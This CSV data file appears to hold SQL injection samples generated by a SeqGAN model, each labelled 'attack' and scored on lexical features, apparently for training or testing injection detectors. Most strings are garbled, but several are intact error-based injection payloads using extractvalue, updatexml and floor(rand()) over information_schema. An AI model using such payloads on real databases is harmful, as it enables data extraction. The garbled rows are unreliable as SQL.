label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"11%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  """"  --.(  ,floor  (  =  )   or 3931 FROM x end  )   then when  (  ||chr  (  4493  ||chr  hrr  (  benchmark  select else AND union R ,  ||chq  112  #,1  )   x   4232  0 andrhr  (  ||chr  (  SELECT information_schemar  (  ||chr  6237,concat  =  ||chr  (  4493  ||chr  (  =  =  || 1 by from dxtsddr.s",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426,526.0,57.0,4.189238221156944,195.0,64.0,196.0,71.0,0.37072243346007605,0.12167300380228137,0.3726235741444867,0.13498098859315588,0.0,3.0,2.0,0.0,0.0,5.0,0.0,31.0,1.0,1.0,9.0,23.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,1.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1'   ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427,5.0,3.0,1.3709505944546687,0.0,1.0,3.0,1.0,0.0,0.2,0.6,0.2,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'a'   (  0  axOrouiinadztqakv_.r  (  (  )  select RA  ||chr  (  4232  0  ) select 90671   (  ||chrounerodrana WHEREIweriesa s unionr  =  and 6055  )     )   from )  )  9325  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428,357.0,47.0,3.999073054671851,116.0,54.0,141.0,46.0,0.32492997198879553,0.15126050420168066,0.3949579831932773,0.12885154061624648,3.0,0.0,2.0,0.0,0.0,2.0,0.0,28.0,0.0,1.0,5.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"11""",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429,3.0,2.0,0.9182958340544896,0.0,2.0,0.0,1.0,0.0,0.6666666666666666,0.0,0.3333333333333333,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430,9.0,5.0,2.0588138903312014,0.0,0.0,4.0,5.0,0.0,0.0,0.4444444444444444,0.5555555555555556,0.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-%et_  (  0x7171706a71||chou,  0  )    6055  9325  a G 6082  (  4232  =  )   from 4493 m   )    e when0x78 union1 else from R  (  || unionu  select else group union (  ||ch rNRsgroupeselect(  ||es else FROM 1      )   ,concat  )  (  ,  select 1   and  #iv,0x717a767a71,concat  =  = when elsea    elseselect T  (   and tujhrhrgo.syeu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431,332.0,50.0,4.409600323762026,151.0,46.0,102.0,33.0,0.45481927710843373,0.13855421686746988,0.3072289156626506,0.09939759036144578,0.0,0.0,1.0,0.0,0.0,3.0,0.0,12.0,1.0,1.0,5.0,12.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"-6236   112    )     ||chr   x  )    )     and  )     4232,floor  (  ||chr  (  #  (  ||chuieasyjysan_adroyr_rinesas groupc  )  (    ,0x717a767a71,1   then1  when when I  || end  )  case C m concat  (  5023  )  ||chr  (  =  ||chr  (  select from 0 44930x717a767a71  )   then 1 3051 1 1 5192INLIAT  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432,300.0,45.0,4.185623160209029,107.0,51.0,106.0,36.0,0.3566666666666667,0.17,0.35333333333333333,0.12,0.0,0.0,1.0,0.0,0.0,2.0,0.0,15.0,0.0,2.0,3.0,15.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-48221392r0||0  =u  ,0x717a767a71,1   SELECT 122hhrr  tr  (  (  #i  ,  || else 0 groupand 0 1  )   '  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'end  and when      ||chr  ant  6237,  (  =  0  or2131 6055alt  0   (  ||chr   or (  case end from when  (  ||cadxdr  (  (  6237  )     ||IMIITE  FROMet_auas  (  SELECT when dx.  (  ||chahr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433,490.0,52.0,4.233489091982957,179.0,80.0,173.0,58.0,0.3653061224489796,0.16326530612244897,0.35306122448979593,0.11836734693877551,2.0,0.0,1.0,0.0,0.0,3.0,0.0,26.0,0.0,1.0,9.0,18.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'tzw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434,263.0,38.0,4.033064783226906,103.0,35.0,93.0,32.0,0.3916349809885932,0.13307984790874525,0.35361216730038025,0.12167300380228137,2.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,1.0,2.0,5.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%&ert  (       (  )  )    (  ||r  u,hr  x  (  =  )   6055  )   )    (  )  || duadr. dr  5023  (   then3931 FROMua select 3931 group end   )     )  )   from ||xE  =  >  ||,r  (  rand  ||chr  (  (  *,concat  =  1392_rhr  (  =  4232  =  (  ,Sconcat  e   (  e  ||r  (     )    having   select GFROM 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435,297.0,46.0,3.761052308607655,89.0,26.0,132.0,50.0,0.2996632996632997,0.08754208754208755,0.4444444444444444,0.16835016835016836,0.0,0.0,0.0,0.0,1.0,5.0,0.0,23.0,1.0,1.0,4.0,20.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%concat  having DIESEE by D end   orSAIySTSTS. end  ||chr  (  1  ,concat  (  ,     )  =  )  )    (  00x717a767a71)   )  ||coudr.seysa (  =  then RAM end  113  u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436,161.0,38.0,4.185770336997816,71.0,15.0,55.0,20.0,0.4409937888198758,0.09316770186335403,0.3416149068322981,0.12422360248447205,0.0,0.0,0.0,0.0,0.0,2.0,0.0,9.0,1.0,0.0,2.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"oN%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437,10.0,6.0,2.321928094887362,2.0,0.0,4.0,4.0,0.2,0.0,0.4,0.4,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'||  (  select 'ru_towt_zz""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438,34.0,18.0,3.7555742378637427,14.0,1.0,9.0,10.0,0.4117647058823529,0.029411764705882353,0.2647058823529412,0.29411764705882354,2.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack," ' SELECT Rs else or 9067 then 1 DT  (  select 'i'  =  ||r.(  case  )  ||chr  (  )  ,concat  (  (    *2 3051   )    havingOr  (  ||chr  (  =  ||c  (  )2   xITr  euT  select AIExNTet_nal  =  uinin0x7171706a71,0x78   )    ||chhrhr  (  ||chr  select 'i'  0  )   )    ,  )  )   0 or select FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439,290.0,47.0,4.119534958280794,113.0,26.0,107.0,44.0,0.3896551724137931,0.0896551724137931,0.3689655172413793,0.15172413793103448,5.0,0.0,0.0,0.0,1.0,3.0,0.0,18.0,0.0,1.0,3.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1'||  (  select 'a   ' like 'fromes.c  (  =  || me  aT  0x7171706a71m   or LIIINcz5996  ||s 3112  select WHERE union and and union thenu 2131 0   from p mn whena ANT  (  )  (  ||IINNCT.g.s.ch  =  =  ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,440,199.0,46.0,4.508551480672833,92.0,24.0,59.0,24.0,0.4623115577889447,0.12060301507537688,0.2964824120603015,0.12060301507537688,4.0,0.0,0.0,0.0,0.0,3.0,0.0,5.0,0.0,0.0,0.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,2.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"15606   )    from ,x 1 6825 when  (  ||chs.s      (  >  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,441,58.0,25.0,3.5329587150149586,13.0,10.0,25.0,10.0,0.22413793103448276,0.1724137931034483,0.43103448275862066,0.1724137931034483,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,-WHERE2131unions from     AM chr  (  113  case L  0 O1NST 4493,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,442,62.0,32.0,4.253822471635877,29.0,13.0,18.0,2.0,0.46774193548387094,0.20967741935483872,0.2903225806451613,0.03225806451612903,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"15483t_r  0x7171706a71randcoua_r  select or 1 7158 or else t_r   (  ||chor.t  =  =,  =hro",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,443,89.0,28.0,4.18374161253709,37.0,20.0,21.0,11.0,0.4157303370786517,0.2247191011235955,0.23595505617977527,0.12359550561797752,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,3.0,1.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'a   select),1 - 1 FROMauads.trr   (  ||chr  (  case concat  '   case 0cE(  )   tysssy(  chge   tr  (  122  )     0x717a767a71   )     then select else when  (  ) SELECT or  6913  112  ,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,444,187.0,40.0,4.030416034153385,79.0,23.0,66.0,19.0,0.42245989304812837,0.12299465240641712,0.35294117647058826,0.10160427807486631,2.0,0.0,1.0,0.0,0.0,0.0,0.0,11.0,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'  )  ,,1   thenor  4493  )    )    )   x 3931 by else DINelse when 3931 4386  (  ||al_alal_alt  113  SELECT 1210  er   then 4493  )  #2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,445,137.0,37.0,4.009915889571428,45.0,30.0,48.0,14.0,0.3284671532846715,0.21897810218978103,0.35036496350364965,0.10218978102189781,1.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,2.0,2.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'FROM"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,446,191.0,39.0,4.091132791098719,54.0,46.0,65.0,26.0,0.28272251308900526,0.24083769633507854,0.3403141361256545,0.13612565445026178,2.0,2.0,1.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,6.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%b""  =  ""5840",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,447,14.0,10.0,3.0930692077718898,1.0,5.0,4.0,4.0,0.07142857142857142,0.35714285714285715,0.2857142857142857,0.2857142857142857,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-83821  106  case when   (  case 0 AND from1   x.ss   )   x   gIT  (  ~  =  )     e   (tlt_inleanalt  =  u,  *,floor  (  0x7171706a71||chhr  0x4b774c75   then AsI.er.drrhr  (  (  select or 0cl  )   SELECT   (  =_   )     and1   then E(  ||chhr  0x7171706a716055  ,  rand  ,8190||  ||chr  (  (  SELECTthselect  t.=",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,448,313.0,49.0,4.301432463028697,120.0,47.0,107.0,39.0,0.38338658146964855,0.1501597444089457,0.34185303514376997,0.12460063897763578,0.0,0.0,1.0,0.0,1.0,4.0,0.0,14.0,0.0,2.0,4.0,14.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'||  (  select 'rxemasz.r  (  case  ,floor  4493   and ) 3931  0 || duas s whereIt_r  (  chr  (  9173  ||chr  (  =  tU,7562  ||ch  =  =  thenchr   )  6913)     --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,449,163.0,38.0,4.067914481788785,56.0,22.0,58.0,27.0,0.34355828220858897,0.13496932515337423,0.3558282208588957,0.1656441717791411,2.0,0.0,2.0,0.0,0.0,3.0,0.0,8.0,0.0,1.0,2.0,13.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1oq'  =  'l8wheretyu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,450,20.0,15.0,3.7219280948873625,11.0,2.0,4.0,3.0,0.55,0.1,0.2,0.15,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   (  )     8877 information_schema.chr  (  (  SELECT union from  (  SELECT from   hr  rand  4232  =  )    )    )   (  )     )    )   then 7158  rand,concat  (  ||chr  (  *,1 m   (  )  ||r  )    )     from D CFROM  AND extractvaluehr  (  ||  (  113  )  (  )  select else FROMU when when(  1045  select dr  )  9067,floor  (  =  =u  )   (  (  ,0x717a767a71,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,451,361.0,51.0,4.109113511285043,137.0,35.0,142.0,47.0,0.37950138504155123,0.09695290858725762,0.39335180055401664,0.13019390581717452,0.0,1.0,0.0,0.0,1.0,3.0,0.0,29.0,0.0,1.0,5.0,10.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'ni,floor  )     )     =  casea   =  SELECTselect (  case  select 1210  (  )  )     4386 xhr  (  ||char  (  then_chr  c  (  8190   (  select 4386  0x7171706a71   x   )    )    )     4493  )  (  )   )     0 6082   )   SELECT by dt  (  ||chrow  ||chount     (  )  )   )    ,0x717a767a71,floor  6237,FROM  select where FROMxar  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,452,329.0,44.0,3.9777321392499974,109.0,49.0,133.0,38.0,0.331306990881459,0.14893617021276595,0.40425531914893614,0.11550151975683891,1.0,0.0,0.0,0.0,0.0,2.0,0.0,24.0,0.0,1.0,4.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,7.0
attack,"-106nun   )    ()    tunthhr  )  select x   then 1 d'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ' union 5192s R.x CT   andl  #a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,453,413.0,45.0,3.8908333718183394,139.0,62.0,167.0,45.0,0.3365617433414044,0.15012106537530268,0.4043583535108959,0.1089588377723971,2.0,0.0,1.0,0.0,2.0,1.0,0.0,30.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,4.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'l,SELECT  (  x  )    fromu  6825E0x717a767a71,concat  (  4386  (  )    )   ) when 6913  || from from    (  )     )    = when   select when   ||chrS  (  (  from  =  )     and    m  when  (  )   --ljex.p   (  select   (  =  )     )   from 4493 m   x.   SELECT end group or or else A  )  )   )   from concata select end  )   x   then 1  select x  )    ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,454,555.0,46.0,3.953141954906386,206.0,63.0,225.0,61.0,0.37117117117117115,0.11351351351351352,0.40540540540540543,0.10990990990990991,2.0,0.0,2.0,0.0,0.0,4.0,0.0,38.0,0.0,0.0,7.0,12.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,0.0,0.0,5.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
